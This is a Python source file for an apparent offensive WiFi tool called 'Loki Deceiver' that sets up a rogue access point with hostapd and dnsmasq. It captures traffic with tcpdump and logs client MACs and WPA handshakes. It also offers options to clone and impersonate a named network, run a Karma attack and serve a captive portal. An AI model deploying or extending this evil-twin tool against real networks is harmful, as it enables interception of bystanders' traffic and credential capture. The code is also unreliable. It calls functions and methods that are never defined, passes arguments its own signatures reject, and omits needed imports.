"""loki_deceiver.py - Rogue AP creation and WiFi auth capture (scapy/hostapd)."""

import os
import json
import argparse
from datetime import datetime
import logging
import subprocess
import signal
import time
import threading
import scapy.all as scapy
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt


b_class       = "LokiDeceiver"
b_module      = "loki_deceiver"
b_enabled    = 0

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Default settings
DEFAULT_OUTPUT_DIR = "/home/bjorn/Bjorn/data/output/wifi"
DEFAULT_SETTINGS_DIR = "/home/bjorn/.settings_bjorn"
SETTINGS_FILE = os.path.join(DEFAULT_SETTINGS_DIR, "loki_deceiver_settings.json")

class LokiDeceiver:
    def __init__(self, interface, ssid, channel=6, password=None, output_dir=DEFAULT_OUTPUT_DIR):
        self.interface = interface
        self.ssid = ssid
        self.channel = channel
        self.password = password
        self.output_dir = output_dir
        
        self.original_mac = None
        self.captured_handshakes = []
        self.captured_credentials = []
        self.active = False
        self.lock = threading.Lock()

    def setup_interface(self):
        """Configure wireless interface for AP mode."""
        try:
            # Kill potentially interfering processes
            subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'], 
                         stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # Stop NetworkManager
            subprocess.run(['sudo', 'systemctl', 'stop', 'NetworkManager'],
                         stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # Save original MAC
            self.original_mac = self.get_interface_mac()
            
            # Enable monitor mode
            subprocess.run(['sudo', 'ip', 'link', 'set', self.interface, 'down'],
                         stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            subprocess.run(['sudo', 'iw', self.interface, 'set', 'monitor', 'none'],
                         stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            subprocess.run(['sudo', 'ip', 'link', 'set', self.interface, 'up'],
                         stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            logging.info(f"Interface {self.interface} configured in monitor mode")
            return True
            
        except Exception as e:
            logging.error(f"Failed to setup interface: {e}")
            return False

    def get_interface_mac(self):
        """Get the MAC address of the wireless interface."""
        try:
            result = subprocess.run(['ip', 'link', 'show', self.interface],
                                  stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            if result.returncode == 0:
                mac = re.search(r'link/ether ([0-9a-f:]{17})', result.stdout)
                if mac:
                    return mac.group(1)
        except Exception as e:
            logging.error(f"Failed to get interface MAC: {e}")
        return None

    def create_ap_config(self):
        """Create configuration for hostapd."""
        try:
            config = [
                'interface=' + self.interface,
                'driver=nl80211',
                'ssid=' + self.ssid,
                'hw_mode=g',
                'channel=' + str(self.channel),
                'macaddr_acl=0',
                'ignore_broadcast_ssid=0'
            ]
            
            if self.password:
                config.extend([
                    'auth_algs=1',
                    'wpa=2',
                    'wpa_passphrase=' + self.password,
                    'wpa_key_mgmt=WPA-PSK',
                    'wpa_pairwise=CCMP',
                    'rsn_pairwise=CCMP'
                ])
            
            config_path = '/tmp/hostapd.conf'
            with open(config_path, 'w') as f:
                f.write('\n'.join(config))
            
            return config_path
            
        except Exception as e:
            logging.error(f"Failed to create AP config: {e}")
            return None

    def setup_dhcp(self):
        """Configure DHCP server using dnsmasq."""
        try:
            config = [
                'interface=' + self.interface,
                'dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h',
                'dhcp-option=3,192.168.1.1',
                'dhcp-option=6,192.168.1.1',
                'server=8.8.8.8',
                'log-queries',
                'log-dhcp'
            ]
            
            config_path = '/tmp/dnsmasq.conf'
            with open(config_path, 'w') as f:
                f.write('\n'.join(config))
            
            # Configure interface IP
            subprocess.run(['sudo', 'ifconfig', self.interface, '192.168.1.1', 'netmask', '255.255.255.0'],
                         stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            return config_path
            
        except Exception as e:
            logging.error(f"Failed to setup DHCP: {e}")
            return None

    def start_ap(self):
        """Start the fake access point."""
        try:
            if not self.setup_interface():
                return False
            
            hostapd_config = self.create_ap_config()
            dhcp_config = self.setup_dhcp()
            
            if not hostapd_config or not dhcp_config:
                return False
            
            # Start hostapd
            self.hostapd_process = subprocess.Popen(
                ['sudo', 'hostapd', hostapd_config],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            # Start dnsmasq
            self.dnsmasq_process = subprocess.Popen(
                ['sudo', 'dnsmasq', '-C', dhcp_config],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            self.active = True
            logging.info(f"Access point {self.ssid} started on channel {self.channel}")
            
            # Start packet capture
            self.start_capture()
            
            return True
            
        except Exception as e:
            logging.error(f"Failed to start AP: {e}")
            return False

    def start_capture(self):
        """Start capturing wireless traffic."""
        try:
            # Start tcpdump for capturing handshakes
            handshake_path = os.path.join(self.output_dir, 'handshakes')
            os.makedirs(handshake_path, exist_ok=True)
            
            timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
            pcap_file = os.path.join(handshake_path, f"capture_{timestamp}.pcap")
            
            self.tcpdump_process = subprocess.Popen(
                ['sudo', 'tcpdump', '-i', self.interface, '-w', pcap_file],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            # Start sniffing in a separate thread
            self.sniffer_thread = threading.Thread(target=self.packet_sniffer)
            self.sniffer_thread.start()
            
        except Exception as e:
            logging.error(f"Failed to start capture: {e}")

    def packet_sniffer(self):
        """Sniff and process packets."""
        try:
            scapy.sniff(iface=self.interface, prn=self.process_packet, store=0,
                       stop_filter=lambda p: not self.active)
        except Exception as e:
            logging.error(f"Sniffer error: {e}")

    def process_packet(self, packet):
        """Process captured packets."""
        try:
            if packet.haslayer(Dot11):
                # Process authentication attempts
                if packet.type == 0 and packet.subtype == 11:  # Authentication
                    self.process_auth(packet)
                
                # Process association requests
                elif packet.type == 0 and packet.subtype == 0:  # Association request
                    self.process_assoc(packet)
                
                # Process EAPOL packets for handshakes
                elif packet.haslayer(EAPOL):
                    self.process_handshake(packet)
                    
        except Exception as e:
            logging.error(f"Error processing packet: {e}")

    def process_auth(self, packet):
        """Process authentication packets."""
        try:
            if packet.addr2:  # Source MAC
                with self.lock:
                    self.captured_credentials.append({
                        'type': 'auth',
                        'mac': packet.addr2,
                        'timestamp': datetime.now().isoformat()
                    })
        except Exception as e:
            logging.error(f"Error processing auth packet: {e}")

    def process_assoc(self, packet):
        """Process association packets."""
        try:
            if packet.addr2:  # Source MAC
                with self.lock:
                    self.captured_credentials.append({
                        'type': 'assoc',
                        'mac': packet.addr2,
                        'timestamp': datetime.now().isoformat()
                    })
        except Exception as e:
            logging.error(f"Error processing assoc packet: {e}")

    def process_handshake(self, packet):
        """Process EAPOL packets for handshakes."""
        try:
            if packet.addr2:  # Source MAC
                with self.lock:
                    self.captured_handshakes.append({
                        'mac': packet.addr2,
                        'timestamp': datetime.now().isoformat()
                    })
        except Exception as e:
            logging.error(f"Error processing handshake packet: {e}")

    def save_results(self):
        """Save captured data to JSON files."""
        try:
            os.makedirs(self.output_dir, exist_ok=True)
            timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
            
            results = {
                'ap_info': {
                    'ssid': self.ssid,
                    'channel': self.channel,
                    'interface': self.interface
                },
                'credentials': self.captured_credentials,
                'handshakes': self.captured_handshakes
            }
            
            output_file = os.path.join(self.output_dir, f"results_{timestamp}.json")
            with open(output_file, 'w') as f:
                json.dump(results, f, indent=4)
                
            logging.info(f"Results saved to {output_file}")
            
        except Exception as e:
            logging.error(f"Failed to save results: {e}")

    def cleanup(self):
        """Clean up resources and restore interface."""
        try:
            self.active = False
            
            # Stop processes
            for process in [self.hostapd_process, self.dnsmasq_process, self.tcpdump_process]:
                if process:
                    process.terminate()
                    process.wait()
            
            # Restore interface
            if self.original_mac:
                subprocess.run(['sudo', 'ip', 'link', 'set', self.interface, 'down'],
                             stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                subprocess.run(['sudo', 'iw', self.interface, 'set', 'type', 'managed'],
                             stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                subprocess.run(['sudo', 'ip', 'link', 'set', self.interface, 'up'],
                             stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # Restart NetworkManager
            subprocess.run(['sudo', 'systemctl', 'start', 'NetworkManager'],
                         stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            logging.info("Cleanup completed")
            
        except Exception as e:
            logging.error(f"Error during cleanup: {e}")

def save_settings(interface, ssid, channel, password, output_dir):
    """Save settings to JSON file."""
    try:
        os.makedirs(DEFAULT_SETTINGS_DIR, exist_ok=True)
        settings = {
            "interface": interface,
            "ssid": ssid,
            "channel": channel,
            "password": password,
            "output_dir": output_dir
        }
        with open(SETTINGS_FILE, 'w') as f:
            json.dump(settings, f)
        logging.info(f"Settings saved to {SETTINGS_FILE}")
    except Exception as e:
        logging.error(f"Failed to save settings: {e}")

def load_settings():
    """Load settings from JSON file."""
    if os.path.exists(SETTINGS_FILE):
        try:
            with open(SETTINGS_FILE, 'r') as f:
                return json.load(f)
        except Exception as e:
            logging.error(f"Failed to load settings: {e}")
    return {}

def main():
    parser = argparse.ArgumentParser(description="WiFi deception tool")
    parser.add_argument("-i", "--interface", default="wlan0", help="Wireless interface")
    parser.add_argument("-s", "--ssid", help="SSID for fake AP")
    parser.add_argument("-c", "--channel", type=int, default=6, help="WiFi channel")
    parser.add_argument("-p", "--password", help="WPA2 password")
    parser.add_argument("-o", "--output", default=DEFAULT_OUTPUT_DIR, help="Output directory")

    # Honeypot options
    parser.add_argument("--captive-portal", action="store_true", help="Enable captive portal")
    parser.add_argument("--clone-ap", help="SSID to clone and impersonate")
    parser.add_argument("--karma", action="store_true", help="Enable Karma attack mode")
    
    # Advanced options
    parser.add_argument("--beacon-interval", type=int, default=100, help="Beacon interval in ms")
    parser.add_argument("--max-clients", type=int, default=10, help="Maximum number of clients")
    parser.add_argument("--timeout", type=int, help="Runtime duration in seconds")
    
    args = parser.parse_args()

    settings = load_settings()
    interface = args.interface or settings.get("interface")
    ssid = args.ssid or settings.get("ssid")
    channel = args.channel or settings.get("channel")
    password = args.password or settings.get("password")
    output_dir = args.output or settings.get("output_dir")

    # Load advanced settings
    captive_portal = args.captive_portal or settings.get("captive_portal", False)
    clone_ap = args.clone_ap or settings.get("clone_ap")
    karma = args.karma or settings.get("karma", False)
    beacon_interval = args.beacon_interval or settings.get("beacon_interval", 100)
    max_clients = args.max_clients or settings.get("max_clients", 10)
    timeout = args.timeout or settings.get("timeout")

    if not interface:
        logging.error("Interface is required. Use -i or save it in settings")
        return

    # Clone AP if requested
    if clone_ap:
        logging.info(f"Attempting to clone AP: {clone_ap}")
        clone_info = scan_for_ap(interface, clone_ap)
        if clone_info:
            ssid = clone_info['ssid']
            channel = clone_info['channel']
            logging.info(f"Successfully cloned AP settings: {ssid} on channel {channel}")
        else:
            logging.error(f"Failed to find AP to clone: {clone_ap}")
            return

    # Save all settings
    save_settings(
        interface=interface,
        ssid=ssid,
        channel=channel,
        password=password,
        output_dir=output_dir,
        captive_portal=captive_portal,
        clone_ap=clone_ap,
        karma=karma,
        beacon_interval=beacon_interval,
        max_clients=max_clients,
        timeout=timeout
    )

    # Create and configure deceiver
    deceiver = LokiDeceiver(
        interface=interface,
        ssid=ssid,
        channel=channel,
        password=password,
        output_dir=output_dir,
        captive_portal=captive_portal,
        karma=karma,
        beacon_interval=beacon_interval,
        max_clients=max_clients
    )

    try:
        # Start the deception
        if deceiver.start():
            logging.info(f"Access point {ssid} started on channel {channel}")
            
            if timeout:
                logging.info(f"Running for {timeout} seconds")
                time.sleep(timeout)
                deceiver.stop()
            else:
                logging.info("Press Ctrl+C to stop")
                while True:
                    time.sleep(1)
                    
    except KeyboardInterrupt:
        logging.info("Stopping Loki Deceiver...")
    except Exception as e:
        logging.error(f"Unexpected error: {e}")
    finally:
        deceiver.stop()
        logging.info("Cleanup completed")

if __name__ == "__main__":
    # Set process niceness to high priority
    try:
        os.nice(-10)
    except:
        logging.warning("Failed to set process priority. Running with default priority.")
        
    # Start main function
    main()